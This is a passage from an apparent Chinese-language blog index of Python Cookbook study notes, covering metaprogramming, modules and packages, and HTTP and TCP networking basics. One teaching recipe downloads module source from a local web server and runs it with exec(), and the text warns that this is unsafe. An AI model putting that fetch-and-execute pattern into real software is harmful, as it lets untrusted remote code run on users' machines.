TypeError('{} must be a {}'.format(name, expected_type))\n    setattr(self, storage_name, value)\n\n  return prop 使用: # Example use\nclass Person:\n  name = typed_property('name', str)\n  age = typed_property('age', int)\n\n  def __init__(self, name, age):\n    self.name = name\n    self.age = age 讨论 函数 typed_property() 看上去有点难理解，其实它所做的仅仅就是为你生成属性并\n返回这个属性对象。因此，当在一个类中使用它的时候，效果跟将它里面的代码放到\n类定义中去是一样的。 还可以使用 functools.partial() 来稍稍改变下: from functools import partial\nString = partial(typed_property, expected_type=str)\nInteger = partial(typed_property, expected_type=int)\n\n# Example:\nclass Person:\n  name = String('name')\n  age = Integer('age')\n\n  def __init__(self, name, age):\n    self.name = name\n    self.age = age 定义上下文管理器的简单方法 问题 你想自己去实现一个新的上下文管理器，以便使用 with 语句。 解决方案 实现一个新的上下文管理器的最简单的方法就是使用 contexlib 模块中的\n@contextmanager 装饰器 如: import time\nfrom contextlib import contextmanager\n\n@contextmanager\ndef timethis(label):\n  start = time.time()\n  try:\n    yield\n  finally:\n    end = time.time()\n    print('{}: {}'.format(label, end - start))\n\n# Example use\nwith timethis('counting'):\n  n = 10000000\n  while n > 0: n -= 1 在函数 timethis() 中，yield 之前的代码会在上下文管理器中作为 __enter__()\n方法执行，所有在 yield 之后的代码会作为 __exit__() 方法执行。如果出现了异常，\n异常会在 yield 语句那里抛出。 更加高级一点的上下文管理器，实现了列表对象上的某种事务: @contextmanager\ndef list_transaction(orig_list):\n  working = list(orig_list)\n  yield working\n  orig_list[:] = working @contextmanager 应该仅仅用来写自包含的上下文管理函数。如果你有一些对\n象 (比如一个文件、网络连接或锁)，需要支持 with 语句，那么你就需要单独实现\n__enter__() 方法和 __exit__() 方法。 在局部变量域中执行代码 问题 你想在使用范围内执行某个代码片段，并且希望在执行后所有的结果都不可见 为了理解这个问题，先试试一个简单场景。首先，在全局命名空间内执行一个代码\n片段: >>> a = 13\n>>> exec('b = a + 1')\n>>> print(b)\n14\n>>> 然后，再在一个函数中执行同样的代码: >>> def test():\n...   a = 13\n...   exec('b = a + 1')\n...   print(b)\n...\n>>> test()\nTraceback (most recent call last):\nFile \"<stdin>\", line 1, in <module>\nFile \"<stdin>\", line 4, in test\nNameError: global name 'b' is not defined\n>>> 为了修正这样的错误，你需要在调用 exec() 之前使用 locals() 函数来得到一个\n局部变量字典。之后你就能从局部字典中获取修改过后的变量值了: >>> def test():\n...   a = 13\n...   loc = locals()\n...   exec('b = a + 1')\n...   b = loc['b']\n...   print(b)\n...\n>>> test()\n14\n>>> 讨论 实际上对于 exec() 的正确使用是比较难的。大多数情况下当你要考虑使用 exec()\n的时候，还有另外更好的解决方案（比如装饰器、闭包、元类等等）。 默认情况下，exec() 会在调用者局部和全局范围内执行代码。然而，在函数里面，传递给\nexec() 的局部范围是拷贝实际局部变量组成的一个字典。因此，如果 exec() 如果执\n行了修改操作，这种修改后的结果对实际局部变量值是没有影响的: >>> def test1():\n...   x = 0\n...   exec('x += 1')\n...   print(x)\n...\n>>> test1()\n0\n>>> 另一个演示例子: >>> def test2():\n...   x = 0\n...   loc = locals()\n...   print('before:', loc)\n...   exec('x += 1')\n...   print('after:', loc)\n...   print('x =', x)\n...\n>>> test2()\nbefore: {'x': 0}\nafter: {'loc': {...}, 'x': 1}\nx = 0\n>>> 仔细观察最后一步的输出，除非你将 loc 中被修改后的值手动赋值给 x，否则 x\n变量值是不会变的。 在使用 locals() 的时候，你需要注意操作顺序。每次它被调用的时候，locals()\n会获取局部变量值中的值并覆盖字典中相应的变量。 作为 locals() 的一个替代方案，你可以使用你自己的字典，并将它传递给 exec()\n。例如: >>> def test4():\n...   a = 13\n...   loc = { 'a' : a }\n...   glb = { }\n...   exec('b = a + 1', glb, loc)\n...   b = loc['b']\n...   print(b)\n...\n>>> test4()\n14\n>>> 解析与分析 Python 源码 问题 你想写解析并分析 Python 源代码的程序 解决方案 大部分程序员知道 Python 能够计算或执行字符串形式的源代码: >>> x = 42\n>>> eval('2 + 3*4 + x')\n56\n>>> exec('for i in range(10): print(i)')  # 0123456789\n>>> ast 模块能被用来将 Python 源码编译成一个可被分析的抽象语法树\n（AST）。 例如: >>> import ast\n>>> ex = ast.parse('2 + 3*4 + x', mode='eval')\n>>> ex\n<_ast.Expression object at 0x1007473d0>\n>>> ast.dump(ex)\n\"Expression(body=BinOp(left=BinOp(left=Num(n=2), op=Add(),\nright=BinOp(left=Num(n=3), op=Mult(), right=Num(n=4))), op=Add(),\nright=Name(id='x', ctx=Load())))\"\n>>> top = ast.parse('for i in range(10): print(i)', mode='exec')\n>>> top\n<_ast.Module object at 0x100747390>\n>>> ast.dump(top)\n\"Module(body=[For(target=Name(id='i', ctx=Store()),\niter=Call(func=Name(id='range', ctx=Load()), args=[Num(n=10)],\nkeywords=[], starargs=None, kwargs=None),\nbody=[Expr(value=Call(func=Name(id='print', ctx=Load()),\nargs=[Name(id='i', ctx=Load())], keywords=[], starargs=None,\nkwargs=None))], orelse=[])])\"\n>>> 分析源码树需要你自己更多的学习，它是由一系列 AST 节点组成的。分析这些节点\n最简单的方法就是定义一个访问者类，实现很多 visit_NodeName() 方法，NodeName()\n匹配那些你感兴趣的节点。 例如, 自定义记录了哪些名字被加载、存储和删除的信息类: import ast\n\nclass CodeAnalyzer(ast.NodeVisitor):\n  def __init__(self):\n    self.loaded = set()\n    self.stored = set()\n    self.deleted = set()\n\n  def visit_Name(self, node):\n    if isinstance(node.ctx, ast.Load):\n      self.loaded.add(node.id)\n    elif isinstance(node.ctx, ast.Store):\n      self.stored.add(node.id)\n    elif isinstance(node.ctx, ast.Del):\n      self.deleted.add(node.id)\n\n# Sample usage\nif __name__ == '__main__':\n  # Some Python code\n  code = '''\n  for i in range(10):\n    print(i)\n    del i\n  '''\n\n  # Parse into an AST\n  top = ast.parse(code, mode='exec')\n  # Feed the AST to analyze name usage\n  c = CodeAnalyzer()\n  c.visit(top) 最后，AST 可以通过 compile() 函数来编译并执行。例如: >>> exec(compile(top,'<stdin>', 'exec')) 拆解 Python 字节码 问题 你想通过将你的代码反编译成低级的字节码来查看它底层的工作机制。 解决方案 dis 模块可以被用来输出任何 Python 函数的反编译结果。例如: >>> def countdown(n):\n...   while n > 0:\n...     print('T-minus', n)\n...     n -= 1\n...   print('Blastoff!')\n...\n>>> import dis\n>>> dis.dis(countdown)\n...\n>>> 讨论 当你想要知道你的程序底层的运行机制的时候，dis 模块是很有用的。比如如果你\n想试着理解性能特征。被 dis() 函数解析的原始字节码如下所示: >>> countdown.__code__.co_code\nb\"x'\\x00|\\x00\\x00d\\x01\\x00k\\x04\\x00r)\\x00t\\x00\\x00d\\x02\\x00|\\x00\\x00\\x83\n\\x02\\x00\\x01|\\x00\\x00d\\x03\\x008}\\x00\\x00q\\x03\\x00Wt\\x00\\x00d\\x04\\x00\\x83\n\\x01\\x00\\x01d\\x00\\x00S\"\n>>> 如果你想自己解释这段代码，你需要使用一些在 opcode 模块中定义的常量。例如: >>> c = countdown.__code__.co_code\n>>> import opcode\n\n>>> opcode.opname[c[0]]\n>>> opcode.opname[c[0]]\n'SETUP_LOOP'\n>>> opcode.opname[c[3]]\n'LOAD_FAST'\n>>>","tags":"后端; python","url":"/yq-docs-rear-end-python-cookbook-Metad-programming.html","loc":"/yq-docs-rear-end-python-cookbook-Metad-programming.html"},{"title":"模块与包","text":"模块与包是任何大型程序的核心，就连 Python 安装程序本身也是一个包。本章重\n点涉及有关模块和包的常用编程技术，例如如何组织包、把大型模块分割成多个文件、\n创建命名空间包。同时，也给出了让你自定义导入语句的秘籍。 构建一个模块的层级包 问题 你想将你的代码组织成由很多分层模块构成的包 解决方案 封装成包是很简单的。在文件系统上组织你的代码，并确保每个目录都定义了一个\n__init__.py 文件。例如: graphics/\n  __init__.py\n  primitive/\n    __init__.py\n    line.py\n    fill.py\n    text.py\n  formats/\n    __init__.py\n    png.py\n    jpg.py 一旦你做到了这一点，你应该能够执行各种 import 语句，如下: import graphics.primitive.line\nfrom graphics.primitive import line\nimport graphics.formats.jpg as jpg 绝大部分时候让 __init__.py 空着就好。但是有些情况下可能包含代码,\n如子模块加载: # graphics/formats/__init__.py\nfrom . import jpg\nfrom . import png 敏锐的程序员会发现，即使没有 __init__.py 文件存在，python 仍然会导入包。\n如果你没有定义 __init__.py 时，实际上创建了一个所谓的\"命名空间包\". 控制模块被全部导入的内容 问题 当使用 from module import * 语句时，希望对从模块或包导出的符号进行精确\n控制。 解决方案 在你的模块中定义一个变量 __all__ 来明确地列出需要导出的内容。 举例: # somemodule.py\ndef spam():\n  pass\n\ndef grok():\n  pass\n\nblah = 42\n\n# Only export 'spam' and 'grok'\n__all__ = ['spam', 'grok'] 讨论 尽管强烈反对使用 from module import * , 但是在定义了大量变量名的模块中\n频繁使用。如果你不做任何事, 这样的导入将会导入所有不以下划线开头的。另一方面,\n如果定义了__all__, 那么只有被列举出的东西会被导出。 如果你将 __all__ 定义成一个空列表, 没有东西将被导入。如果 __all__ 包含未\n定义的名字, 在导入时引起 AttributeError。 使用相对路径名导入包中子模块 问题 将代码组织成包, 想用 import 语句从另一个包名没有硬编码过的包的中导入子模\n块。 相对导入只适用于在合适的包中的模块。尤其是在顶层的脚本的简单模块\n中，它们将不起作用。如果包的部分被作为脚本直接执行，那它们将不起作用 另一方面，如果你使用 Python 的-m 选项来执行先前的脚本，相对导入将会正确\n运行。 将模块分割成多个文件 问题 你想将一个模块分割成多个文件。但是你不想将分离的文件统一成一个逻辑模块\n时使已有的代码遭到破坏。 举例, 原有代码: # mymodule.py\nclass A:\n  def spam(self):\n    print('A.spam')\n\nclass B(A):\n  def bar(self):\n    print('B.bar') 假设你想 mymodule.py 分为两个文件，每个定义的一个类,\n首先\n用 mymodule 目录来替换文件 mymodule.py。这这个目录下，创建以下文件: mymodule/\n  __init__.py\n  a.py\n  b.py 在 a.py 文件中插入以下代码: # a.py\nclass A:\n  def spam(self):\n    print('A.spam') 在 b.py 文件中插入以下代码: # b.py\nfrom .a import A\nclass B(A):\n  def bar(self):\n    print('B.bar') 最后，在 __init__.py 中，将 2 个文件粘合在一起: # __init__.py\nfrom .a import A\nfrom .b import B 如果按照这些步骤，所产生的包 MyModule 将作为一个单一的逻辑模块: >>> import mymodule\n>>> a = mymodule.A()\n>>> a.spam()\nA.spam\n>>> b = mymodule.B()\n>>> b.bar()\nB.bar\n>>> 讨论 在这个章节中的主要问题是一个设计问题，不管你是否希望用户使用很多小模块\n或只是一个模块。举个例子，在一个大型的代码库中，你可以将这一切都分割成独立的\n文件，让用户使用大量的 import 语句，就像这样: from mymodule.a import A\nfrom mymodule.b import B ... 这样能工作，但这让用户承受更多的负担，用户要知道不同的部分位于何处。通常\n情况下，将这些统一起来，使用一条 import 将更加容易，就像这样: from mymodule import A, B 对后者而言，让 mymodule 成为一个大的源文件是最常见的。\n当一个模块被分割，你需要特别注意交叉引用的文件名. 整个章节都使用包的相对导入来避免将顶层模块名硬编码到源代码中. 延迟导入。如图所示，__init__.py 文件一次导入所\n有必需的组件的。但是对于一个很大的模块，可能你只想组件在需要时被加载。要做到\n这一点，__init__.py 有细微的变化: # __init__.py\ndef A():\n  from .a import A\n  return A()\n\ndef B():\n  from .b import B\n  return B() 延迟加载的主要缺点是继承和类型检查可能会中断 利用命名空间导入目录分散的代码 问题 你可能有大量的代码，由不同的人来分散地维护。每个部分被组织为文件目录，如\n一个包。然而，你希望能用共同的包前缀将所有组件连接起来，不是将每一个部分作为\n独立的包来安装。 解决方案 从本质上讲，你要定义一个顶级 Python 包，作为一个大集合分开维护子包的命名\n空间。这个问题经常出现在大的应用框架中，框架开发者希望鼓励用户发布插件或附加\n包。 在统一不同的目录里统一相同的命名空间，但是要删去用来将组件联合起来的\n__init__.py 文件。假设你有 Python 代码的两个不同的目录如下: foo-package/\n  spam/\n    blah.py\n\nbar-package/\n  spam/\n    grok.py 让我们看看，如果将 foo-package 和 bar-package 都加到 python 模块路径并尝试导\n入会发生什么: >>> import sys\n>>> sys.path.extend(['foo-package', 'bar-package'])\n>>> import spam.blah\n>>> import spam.grok\n>>> 两个不同的包目录被合并到一起，你可以导入 spam.blah 和 spam.grok，并且它们\n能够工作。 讨论 在这里工作的机制被称为\"包命名空间\"的一个特征。从本质上讲，包命名空间是\n一种特殊的封装设计，为合并不同的目录的代码到一个共同的命名空间。对于大的框\n架，这可能是有用的，因为它允许一个框架的部分被单独地安装下载。它也使人们能够\n轻松地为这样的框架编写第三方附加组件和其他扩展。 包命名空间的关键是确保顶级目录中没有 __init__.py 文件来作为共同的命名空\n间。缺失 __init__.py 文件使得在导入包的时候会发生有趣的事情：这并没有产生错\n误，解释器创建了一个由所有包含匹配包名的目录组成的列表。特殊的包命名空间模块\n被创建，只读的目录列表副本被存储在其 __path__ 变量中。举个例子: >>> import spam\n>>> spam.__path__\n_NamespacePath(['foo-package/spam', 'bar-package/spam'])\n>>> 在定位包的子组件时，目录 __path__ 将被用到 (例如, 当导入 spam.grok 或者\nspam.blah 的时候) 包命名空间的一个重要特点是任何人都可以用自己的代码来扩展命名空间。 举个\n例子，假设你自己的代码目录像这样: my-package/\n  spam/\n    custom.py 如果你将你的代码目录和其他包一起添加到 sys.path，这将无缝地合并到别的\nspam 包目录中: >>> import spam.custom\n>>> import spam.grok\n>>> import spam.blah\n>>> 一个包是否被作为一个包命名空间的主要方法是检查其 __file__ 属性。如果没\n有，那包是个命名空间。这也可以由其字符表现形式中的\"namespace\"这个词体现出\n来: >>> spam.__file__\nTraceback (most recent call last):\nFile \"<stdin>\", line 1, in <module>\nAttributeError: 'module' object has no attribute '__file__'\n>>> spam\n<module 'spam' (namespace)>\n>>> 重新加载模块 问题 你想重新加载已经加载的模块，因为你对其源码进行了修改。 解决方案 使用 imp.reload() 来重新加载先前加载的模块。举个例子: >>> import spam\n>>> import imp\n>>> imp.reload(spam)\n<module 'spam' from './spam.py'>\n>>> 讨论 重新加载模块在开发和调试过程中常常很有用。但在生产环境中的代码使用会不\n安全，因为它并不总是像您期望的那样工作。 reload() 擦除了模块底层字典的内容，并通过重新执行模块的源代码来刷新它。模\n块对象本身的身份保持不变。因此，该操作在程序中所有已经被导入了的地方更新了模\n块。 注解 像 from module import name 这样导入的不会更新 因此，在生产环境中可能需要避免重新加载模块 运行目录或压缩文件 问题 您有一个已成长为包含多个文件的应用，它已远不再是一个简单的脚本，你想向用\n户提供一些简单的方法运行这个程序。 解决方案 如果你的应用程序已经有多个文件，你可以把你的应用程序放进它自己的目录并\n添加一个 __main__.py 文件。举个例子，你可以像这样创建目录: myapplication/\n  spam.py\n  bar.py\n  grok.py\n  __main__.py 如果 __main__.py 存在，你可以简单地在顶级目录运行 Python 解释器: bash % python3 myapplication 解释器将执行 __main__.py 文件作为主程序。\n如果你将你的代码打包成 zip 文件，这种技术同样也适用，举个例子: bash % ls\nspam.py bar.py grok.py __main__.py\nbash % zip -r myapp.zip *.py\nbash % python3 myapp.zip\n... output from __main__.py ... 讨论 创建一个目录或 zip 文件并添加 __main__.py 文件来将一个更大的 Python 应用\n打包是可行的。这和作为标准库被安装到 Python 库的代码包是有一点区别的。相反，\n这只是让别人执行的代码包。 由于目录和 zip 文件与正常文件有一点不同，你可能还需要增加一个 shell 脚本，\n使执行更加容易。例如，如果代码文件名为 myapp.zip，你可以创建这样一个顶级脚本: #!/usr/bin/env python3 /usr/local/bin/myapp.zip 读取位于包中的数据文件 问题 你的包中包含代码需要去读取的数据文件。你需要尽可能地用最便捷的方式来做\n这件事。 解决方案 假设你的包中的文件组织成如下: mypackage/\n  __init__.py\n  somedata.dat\n  spam.py 现在假设 spam.py 文件需要读取 somedata.dat 文件中的内容。你可以用以下代码\n来完成: # spam.py\nimport pkgutil\ndata = pkgutil.get_data(__package__, 'somedata.dat')\n\n由此产生的变量是包含该文件的原始内容的字节字符串。 讨论 要读取数据文件，你可能会倾向于编写使用内置的 I/ O 功能的代码，如 open()。\n但是这种方法也有一些问题。 首先，一个包对解释器的当前工作目录几乎没有控制权。因此，编程时任何 I/O 操\n作都必须使用绝对文件名。由于每个模块包含有完整路径的 __file__ 变量，这弄清楚\n它的路径不是不可能，但它很凌乱。 第二，包通常安装作为.zip 或.egg 文件，这些文件并不像在文件系统上的一个普通\n目录里那样被保存。因此，你试图用 open() 对一个包含数据文件的归档文件进行操作，\n它根本不会工作。 pkgutil.get_data() 函数是一个读取数据文件的高级工具，不用管包是如何安装以\n及安装在哪。它只是工作并将文件内容以字节字符串返回给你 get_data() 的第一个参数是包含包名的字符串。你可以直接使用包名，也可以使\n用特殊的变量，比如 __package__。第二个参数是包内文件的相对名称。如果有必要，\n可以使用标准的 Unix 命名规范到不同的目录，只有最后的目录仍然位于包中。 将文件夹加入到 sys.path 问题 你无法导入你的 Python 代码因为它所在的目录不在 sys.path 里。你想将添加新目\n录到 Python 路径，但是不想硬链接到你的代码。 解决方案 有两种常用的方式将新目录添加到 sys.path。第一种，你可以使用 PYTHONPATH\n环境变量来添加。例如: bash % env PYTHONPATH=/some/dir:/other/dir python3\nPython 3.3.0 (default, Oct 4 2012, 10:17:33)\n[GCC 4.2.1 (Apple Inc. build 5666) (dot 3)] on darwin\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.\n>>> import sys\n>>> sys.path\n['', '/some/dir', '/other/dir', ...]\n>>> 在自定义应用程序中，这样的环境变量可在程序启动时设置或通过 shell 脚本。\n第二种方法是创建一个.pth 文件，将目录列举出来，像这样: # myapplication.pth\n/some/dir\n/other/dir 这个.pth 文件需要放在某个 Python 的 site-packages 目录，通常位于/usr/local/\nlib/python3.3/site-packages 或者 ~/.local/lib/python3.3/sitepackages。当解释器启动时，\n.pth 文件里列举出来的存在于文件系统的目录将被添加到 sys.path。安装一个.pth 文件\n可能需要管理员权限，如果它被添加到系统级的 Python 解释器。 讨论 比起费力地找文件，你可能会倾向于写一个代码手动调节 sys.path 的值。例如: import sys\nsys.path.insert(0, '/some/dir')\nsys.path.insert(0, '/other/dir') 虽然这能\"工作\"，它是在实践中极为脆弱，应尽量避免使用。这种方法的问题是，\n它将目录名硬编码到了你的源代码。如果你的代码被移到一个新的位置，这会导致维\n护问题。 更好的做法是在不修改源代码的情况下，将 path 配置到其他地方。如果您使\n用模块级的变量来精心构造一个适当的绝对路径，有时你可以解决硬编码目录的问题，\n比如 __file__。举个例子: import sys\nfrom os.path import abspath, join, dirname\nsys.path.insert(0, join(abspath(dirname(__file__)), 'src')) 这将 src 目录添加到 path 里，和执行插入步骤的代码在同一个目录里。\nsite-packages 目录是第三方包和模块安装的目录。如果你手动安装你的代码，它将\n被安装到 site-packages 目录。虽然用于配置 path 的.pth 文件必须放置在 site-packages\n里，但它配置的路径可以是系统上任何你希望的目录。因此，你可以把你的代码放在一\n系列不同的目录，只要那些目录包含在.pth 文件里。 通过字符串名导入模块 问题 你想导入一个模块，但是模块的名字在字符串里。你想对字符串调用导入命令。 解决方案 使用 importlib.import_module() 函数来手动导入名字为字符串给出的一个模块或\n者包的一部分。举个例子: >>> import importlib\n>>> math = importlib.import_module('math')\n>>> math.sin(2)\n0.9092974268256817\n>>> mod = importlib.import_module('urllib.request')\n>>> u = mod.urlopen('http://www.python.org')\n>>> import_module 只是简单地执行和 import 相同的步骤，但是返回生成的模块对象。\n你只需要将其存储在一个变量，然后像正常的模块一样使用。 如果你正在使用的包，import_module() 也可用于相对导入。但是，你需要给它一\n个额外的参数。例如: import importlib\n# Same as 'from . import b'\nb = importlib.import_module('.b', __package__) 讨论 使用 import_module() 手动导入模块的问题通常出现在以某种方式编写修改或覆\n盖模块的代码时候。例如，也许你正在执行某种自定义导入机制，需要通过名称来加载\n一个模块，通过补丁加载代码。 在旧的代码，有时你会看到用于导入的内建函数 __import__()。尽管它能工作，\n但是 importlib.import_module() 通常更容易使用。 通过钩子远程加载模块 问题 你想自定义 Python 的 import 语句，使得它能从远程机器上面透明的加载模块。 解决方案 首先要提出来的是安全问题。本节讨论的思想如果没有一些额外的安全和认知机\n制的话会很糟糕。也就是说，我们的主要目的是深入分析 Python 的 import 语句机制。\n如果你理解了本节内部原理，你就能够为其他任何目的而自定义 import。有了这些，让\n我们继续向前走。 本节核心是设计导入语句的扩展功能。有很多种方法可以做这个，不过为了演示的\n方便，我们开始先构造下面这个 Python 代码结构: testcode/\n  spam.py\n  fib.py\n  grok/\n    __init__.py\n    blah.py 这里的目的是允许这些文件作为模块被远程访问。也许最简单的方式就是将它们\n发布到一个 web 服务器上面。在 testcode 目录中像下面这样运行 Python: bash % cd testcode\nbash % python3 -m http.server 15000\nServing HTTP on 0.0.0.0 port 15000 ... 服务器运行起来后再启动一个单独的 Python 解释器。确保你可以使用 urllib 访\n问到远程文件。例如: >>> from urllib.request import urlopen\n>>> u = urlopen('http://localhost:15000/fib.py')\n>>> data = u.read().decode('utf-8')\n>>> print(data)\n# fib.py\nprint(\"I'm fib\")\ndef fib(n):\n  if n < 2:\n    return 1\n  else:\n    return fib(n-1) + fib(n-2)\n>>> 从这个服务器加载源代码是接下来本节的基础。为了替代手动的通过 urlopen()\n来收集源文件，我们通过自定义 import 语句来在后台自动帮我们做到\n加载远程模块的第一种方法是创建一个显示的加载函数来完成它: import imp\nimport urllib.request\nimport sys\n\ndef load_module(url):\n  u = urllib.request.urlopen(url)\n  source = u.read().decode('utf-8')\n  mod = sys.modules.setdefault(url, imp.new_module(url))\n  code = compile(source, url, 'exec')\n  mod.__file__ = url\n  mod.__package__ = ''\n  exec(code, mod.__dict__)\n  return mod 这个函数会下载源代码，并使用 compile() 将其编译到一个代码对象中，然后在\n一个新创建的模块对象的字典中来执行它。下面是使用这个函数的方式: >>> fib = load_module('http://localhost:15000/fib.py')\nI'm fib 对于简单的模块这个是行得通的。不过它并没有嵌入到通常的 import\n语句中，如果要支持更高级的结构比如包就需要更多的工作了。\n一个更酷的做法是创建一个自定义导入器。第一种方法是创建一个元路径导入器。 麻烦, 无比麻烦, 跳过 导入模块的同时修改模块 问题 你想给某个已存在模块中的函数添加装饰器。不过，前提是这个模块已经被导入并\n且被使用过。 解决方案 这里问题的本质就是你想在模块被加载时执行某个动作。可能是你想在一个模块\n被加载时触发某个回调函数来通知你。 安装私有的包 问题 你想要安装一个第三方包，但是没有权限将它安装到系统 Python 库中去。或者，\n你可能想要安装一个供自己使用的包，而不是系统上面所有用户。 解决方案 Python 有一个用户安装目录，通常类似\"~/.local/lib/python3.3/site-packages\"。\n要强制在这个目录中安装包，可使用安装选项\"–user\"。例如: python3 setup.py install --user\n# 或者\npip install --user packagename 在 sys.path 中用户的\"site-packages\"目录位于系统的\"site-packages\"目录之前。\n因此，你安装在里面的包就比系统已安装的包优先级高（尽管并不总是这样，要取决于\n第三方包管理器，比如 distribute 或 pip）。 创建新的 Python 环境 问题 你想创建一个新的 Python 环境，用来安装模块和包。不过，你不想安装一个新的\nPython 克隆，也不想对系统 Python 环境产生影响。 解决方案 你可以使用 pyvenv 命令创建一个新的\"虚拟\"环境。这个命令被安装在 Python\n解释器同一目录，或 Windows 上面的 Scripts 目录中。 书上是旧版本的, 新版本这样用: python -m venv venv_3910 最后一个参数就是新环境的名称, 是要被创建的目录名, 注意写好后不能移动位置. 讨论 创建虚拟环境通常是为了安装和管理第三方包。正如你在例子中看到的那样，sys.\npath 变量包含来自于系统 Python 的目录，而 site-packages 目录已经被重定位到一个\n新的目录。 有了一个新的虚拟环境，下一步就是安装一个包管理器，比如 distribute 或 pip。\n但安装这样的工具和包的时候，你需要确保你使用的是虚拟环境的解释器。它会将包安\n装到新创建的 site-packages 目录中去。 尽管一个虚拟环境看上去是 Python 安装的一个复制，不过它实际上只包含了少量\n几个文件和一些符号链接。所有标准库函文件和可执行解释器都来自原来的 Python 安\n装。因此，创建这样的环境是很容易的，并且几乎不会消耗机器资源。\n默认情况下，虚拟环境是空的，不包含任何额外的第三方库。如果你想将一个已经 安装的包作为虚拟环境的一部分，可以使用\"–system-site-packages\"选项来创建虚拟\n环境 分发包 问题 你已经编写了一个有用的库，想将它分享给其他人 解决方案 如果你想分发你的代码，第一件事就是给它一个唯一的名字，并且清理它的目录结\n构。例如，一个典型的函数库包会类似下面这样: projectname/\n  README.txt\n  Doc/\n    documentation.txt\n  projectname/\n    __init__.py\n    foo.py\n    bar.py\n  utils/\n    __init__.py\n    spam.py\n    grok.py\n  examples/\n    helloworld.py\n  ... 要让你的包可以发布出去，首先你要编写一个 setup.py ，类似下面这样: # setup.py\nfrom distutils.core import setup\nsetup(name='projectname',\nversion='1.0',\nauthor='Your Name',\nauthor_email='you@youraddress.com',\nurl='http://www.you.com/projectname',\npackages=['projectname', 'projectname.utils'],\n) 下一步，就是创建一个 MANIFEST.in 文件，列出所有在你的包中需要包含进来的\n非源码文件: # MANIFEST.in\ninclude *.txt\nrecursive-include examples *\nrecursive-include Doc * 确保 setup.py 和 MANIFEST.in 文件放在你的包的最顶级目录中。一旦你已经做\n了这些，你就可以像下面这样执行命令来创建一个源码分发包了: % bash python3 setup.py sdist 它会创建一个文件比如\"projectname-1.0.zip\"或\"projectname-1.0.tar.gz\", 具体\n依赖于你的系统平台。如果一切正常，这个文件就可以发送给别人使用或者上传至\nPython Package Index. 讨论 对于纯 Python 代码，编写一个普通的 setup.py 文件通常很简单。一个可能的问\n题是你必须手动列出所有构成包源码的子目录。一个常见错误就是仅仅只列出一个包\n的最顶级目录，忘记了包含包的子组件。这也是为什么在 setup.py 中对于包的说明包\n含了列表 packages=['projectname', 'projectname.utils'] 有很多第三方包管理器供选择，包括 setuptools、\ndistribute 等等。有些是为了替代标准库中的 distutils。注意如果你依赖这些包，用户可\n能不能安装你的软件，除非他们已经事先安装过所需要的包管理器。正因如此，你更应\n该时刻记住越简单越好的道理。最好让你的代码使用标准的 Python 3 安装。如果其他\n包也需要的话，可以通过一个可选项来支持。 对于涉及到 C 扩展的代码打包与分发就更复杂点了。","tags":"后端; python","url":"/yq-docs-rear-end-python-cookbook-Module-and-package.html","loc":"/yq-docs-rear-end-python-cookbook-Module-and-package.html"},{"title":"网络与 Web 编程","text":"本章是关于在网络应用和分布式应用中使用的各种主题。主题划分为使用 Python\n编写客户端程序来访问已有的服务，以及使用 Python 实现网络服务端程序。也给出了\n一些常见的技术，用于编写涉及协同或通信的的代码。 作为客户端与 HTTP 服务交互 问题 你需要通过 HTTP 协议以客户端的方式访问多种服务。例如，下载数据或者与基\n于 REST 的 API 进行交互。 解决方案 对于简单的事情来说，通常使用 urllib.request 模块就够了。例如，发送一个简\n单的 HTTP GET 请求到远程的服务上，可以这样做: from urllib import request, parse\n\n# Base URL being accessed\nurl = 'http://httpbin.org/get'\n\n# Dictionary of query parameters (if any)\nparms = { 'name1' : 'value1', 'name2' : 'value2' }\n\n# Encode the query string\nquerystring = parse.urlencode(parms)\n\n# Make a GET request and read the response\nu = request.urlopen(url+'?' + querystring)\nresp = u.read() 如果你需要使用 POST 方法在请求主体中发送查询参数，可以将参数编码后作为\n可选参数提供给 urlopen() 函数，就像这样: # Make a POST request and read the response\nu = request.urlopen(url, querystring.encode('ascii'))\nresp = u.read() 如果你需要在发出的请求中提供一些自定义的 HTTP 头，例如修改 user-agent 字 段,\n可以创建一个包含字段值的字典，并创建一个 Request 实例然后将其传给 urlopen()\n，如下: from urllib import request, parse\n...\n# Extra headers\nheaders = { 'User-agent' : 'none/ofyourbusiness', 'Spam' : 'Eggs' }\nreq = request.Request(url, querystring.encode('ascii'), headers=headers)\n# Make a request and read the response\nu = request.urlopen(req)\nresp = u.read() 如果需要交互的服务比上面的例子都要复杂，也许应该去看看 requests 库: resp = requests.post(url, data=parms, headers=headers) 关于 requests 库，一个值得一提的特性就是它能以多种方式从请求中返回响应结\n果的内容。 resp.text 带给我们的是以 Unicode 解码的响应文本 resp.content ，就会得到原始的二进制数据 resp.json ，那么就会得到 JSON 格式的响应内容 利用 requests 通过基本认证登录 Pypi import requests\nresp = requests.get('http://pypi.python.org/pypi?:action=login',\n                    auth=('user','password')) 利用 requests 将 HTTP cookies 从一个请求传递到另一个的例子: import requests\n# First request\nresp1 = requests.get(url)\n...\n# Second requests with cookies received on first requests\nresp2 = requests.get(url, cookies=resp1.cookies) 最后但并非最不重要的一个例子是用 requests 上传内容: import requests\nurl = 'http://httpbin.org/post'\nfiles = { 'file': ('data.csv', open('data.csv', 'rb')) }\nr = requests.post(url, files=files) 讨论 对于真的很简单 HTTP 客户端代码，用内置的 urllib 模块通常就足够了。但是，\n如果你要做的不仅仅只是简单的 GET 或 POST 请求，那就真的不能再依赖它的功能\n了。这时候就是第三方模块比如 requests 大显身手的时候了。 request 库还对许多高级的 HTTP 客户端协议提供了支持，\n比如 OAuth。requests 模块的文档（ http://docs.python-requests.org ) 质量很高 创建 TCP 服务器 问题 你想实现一个服务器，通过 TCP 协议和客户端通信。 解决方案 创建一个 TCP 服务器的一个简单方法是使用 socketserver 库。例如，下面是一\n个简单的应答服务器: from socketserver import BaseRequestHandler, TCPServer\n\nclass EchoHandler(BaseRequestHandler):\n  def handle(self):\n    print('Got connection from', self.client_address)\n    while True:\n      msg = self.request.recv(8192)\n      if not msg:\n        break\n      self.request.send(msg)\n\nif __name__ == '__main__':\n  serv = TCPServer(('', 20000), EchoHandler)\n  serv.serve_forever() 使用另一个客户端测试: >>> from socket import socket, AF_INET, SOCK_STREAM\n>>> s = socket(AF_INET, SOCK_STREAM)\n\n>>> s.connect(('localhost', 20000))\n>>> s.send(b'Hello') 5\n>>> s.recv(8192)\nb'Hello'\n>>> 很 多 时 候， 可 以 很 容 易 的 定 义 一 个 不 同 的 处 理 器。 下 面 是 一 个 使 用\nStreamRequestHandler 基类将一个类文件接口放置在底层 socket 上的例子: from socketserver import StreamRequestHandler, TCPServer\nclass EchoHandler(StreamRequestHandler):\n  def 